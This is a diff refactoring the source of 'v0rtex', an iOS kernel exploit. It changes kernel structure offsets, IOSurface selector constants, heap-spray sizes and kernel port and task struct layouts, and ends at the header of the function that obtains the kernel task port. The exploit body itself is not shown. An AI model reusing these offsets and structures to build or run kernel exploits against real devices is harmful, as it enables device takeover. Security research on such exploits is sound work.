@@ -46,57 +46,42 @@
 #include <mach-o/loader.h>
 #include <CoreFoundation/CoreFoundation.h>
 
-#import "common.h"              // LOG, kptr_t
-#import "offsets.h"
 #import "v0rtex.h"
+#import "common.h"
+#import "offsets.h"
 
 
-uint64_t OFFSET_sizeof_task                        = 0x550;
-uint64_t OFFSET_task_itk_registered                = 0x2e8;
-uint64_t OFFSET_task_bsd_info                      = 0x360;
-uint64_t OFFSET_proc_ucred                         = 0x100;
-uint64_t OFFSET_vm_map_hdr                         = 0x10;
-uint64_t OFFSET_ipc_space_is_task                  = 0x28;
-uint64_t OFFSET_realhost_special                   = 0x10;
-uint64_t OFFSET_vtab_get_retain_count              = 0x3;
-uint64_t OFFSET_vtab_get_external_trap_for_index   = 0xb7;
+static const uint64_t OFFSET_sizeof_task                        = 0x550;
+static const uint64_t OFFSET_task_itk_registered                = 0x2e8;
+static const uint64_t OFFSET_task_bsd_info                      = 0x360;
+static const uint64_t OFFSET_proc_ucred                         = 0x100;
+static const uint64_t OFFSET_vm_map_hdr                         = 0x10;
+static const uint64_t OFFSET_ipc_space_is_task                  = 0x28;
+static const uint64_t OFFSET_realhost_special                   = 0x10;
+static const uint64_t OFFSET_vtab_get_retain_count              = 0x3;
+static const uint64_t OFFSET_vtab_get_external_trap_for_index   = 0xb7;
 
-//uint64_t OFFSET_proc_csflags                       = 0x2a8;
+static const uint64_t OFFSET_TASK_ITK_SELF                      = 0xd8;
+static const uint64_t OFFSET_IOUSERCLIENT_IPC                   = 0x9c;
 
+static const uint64_t IOSURFACE_CREATE_OUTSIZE                  = 0x3c8;
 
-// ********** ********** ********** constants ********** ********** **********
+#define KERNEL_MAGIC            MH_MAGIC_64
+#define KERNEL_HEADER_OFFSET    0x4000
+#define KERNEL_SLIDE_STEP       0x100000
 
-#define IOSURFACE_CREATE_OUTSIZE    0x3c8 /* XXX 0x6c8 for iOS 11.0, 0xbc8 for 11.1.2 */
+#define NUM_BEFORE              0x2000
+#define NUM_AFTER               0x1000
+#define NUM_DATA                0x4000
+#define DATA_SIZE               0x1000
+#define VTAB_SIZE               200
 
-#define OFFSET_TASK_ITK_SELF        0xd8
-#define OFFSET_IOUSERCLIENT_IPC     0x9c
+static const uint64_t IOSURFACE_CREATE_SURFACE  = 0;
+static const uint64_t IOSURFACE_SET_VALUE       = 9;
+static const uint64_t IOSURFACE_GET_VALUE       = 10;
+static const uint64_t IOSURFACE_DELETE_VALUE    = 11;
 
-#ifdef __LP64__
-#   define KERNEL_MAGIC             MH_MAGIC_64
-#   define KERNEL_HEADER_OFFSET     0x4000
-#else
-#   define KERNEL_MAGIC             MH_MAGIC
-#   define KERNEL_HEADER_OFFSET     0x1000
-#endif
-
-#define KERNEL_SLIDE_STEP           0x100000
-
-#define NUM_BEFORE                  0x2000
-#define NUM_AFTER                   0x1000
-#define NUM_DATA                    0x4000
-#define DATA_SIZE                   0x1000
-#ifdef __LP64__
-#   define VTAB_SIZE                200
-#else
-#   define VTAB_SIZE                250
-#endif
-
-const uint64_t IOSURFACE_CREATE_SURFACE =  0;
-const uint64_t IOSURFACE_SET_VALUE      =  9;
-const uint64_t IOSURFACE_GET_VALUE      = 10;
-const uint64_t IOSURFACE_DELETE_VALUE   = 11;
-
-const uint32_t IKOT_TASK                = 2;
+static const uint32_t IKOT_TASK                 = 2;
 
 enum
 {
@@ -118,7 +103,9 @@ enum
     kOSSerializeMagic           = 0x000000d3U,
 };
 
-// ********** ********** ********** macros ********** ********** **********
+
+//------------------------------------------------------------------------------
+#pragma mark - macros
 
 #define UINT64_ALIGN(addr) (((addr) + 7) & ~7)
 
@@ -159,7 +146,9 @@ port = MACH_PORT_NULL; \
 } \
 } while(0)
 
-// ********** ********** ********** IOKit ********** ********** **********
+
+//------------------------------------------------------------------------------
+#pragma mark - IOKit
 
 typedef mach_port_t io_service_t;
 typedef mach_port_t io_connect_t;
@@ -172,11 +161,15 @@ kern_return_t IOConnectCallStructMethod(mach_port_t connection, uint32_t selecto
 kern_return_t IOConnectCallAsyncStructMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
 kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);
 
-// ********** ********** ********** other unexported symbols ********** ********** **********
+
+//------------------------------------------------------------------------------
+#pragma mark - other unexported symbols
 
 kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
 
-// ********** ********** ********** helpers ********** ********** **********
+
+//------------------------------------------------------------------------------
+#pragma mark - helpers
 
 static const char *errstr(int r)
 {
@@ -194,7 +187,9 @@ static uint32_t transpose(uint32_t val)
     return ret + 0x01010101;
 }
 
-// ********** ********** ********** MIG ********** ********** **********
+
+//------------------------------------------------------------------------------
+#pragma mark - MIG
 
 static kern_return_t my_mach_zone_force_gc(host_t host)
 {
@@ -446,9 +441,10 @@ static kern_return_t reallocate_buf(io_connect_t client, uint32_t surfaceId, uin
     return ret;
 }
 
-// ********** ********** ********** data structures ********** ********** **********
 
-#ifdef __LP64__
+//------------------------------------------------------------------------------
+#pragma mark - data structures
+
 typedef struct
 {
     kptr_t prev;
@@ -456,7 +452,6 @@ typedef struct
     kptr_t start;
     kptr_t end;
 } kmap_hdr_t;
-#endif
 
 typedef struct {
     uint32_t ip_bits;
@@ -464,9 +459,7 @@ typedef struct {
     struct {
         kptr_t data;
         uint32_t type;
-#ifdef __LP64__
         uint32_t pad;
-#endif
     } ip_lock; // spinlock
     struct {
         struct {
@@ -485,9 +478,7 @@ typedef struct {
             uint32_t receiver_name;
             uint16_t msgcount;
             uint16_t qlimit;
-#ifdef __LP64__
             uint32_t pad;
-#endif
         } port;
         kptr_t klist;
     } ip_messages;
@@ -522,16 +513,12 @@ typedef union
             kptr_t data;
             uint32_t reserved : 24,
             type     :  8;
-#ifdef __LP64__
             uint32_t pad;
-#endif
         } lock; // mutex lock
         uint32_t ref_count;
         uint32_t active;
         uint32_t halting;
-#ifdef __LP64__
         uint32_t pad;
-#endif
         kptr_t map;
     } a;
     struct {
@@ -541,10 +528,8 @@ typedef union
 } ktask_t;
 
 
-
 //------------------------------------------------------------------------------
 #pragma mark - v0rtex exploit
-//------------------------------------------------------------------------------
 
 kern_return_t v0rtex(task_t *tfp0, uint64_t *kslide, uint64_t *kerncred, uint64_t *selfcred, uint64_t *selfproc) {
     kern_return_t retval = KERN_FAILURE,
@@ -1512,3 +1497,4 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
     
     return retval;
 }
+
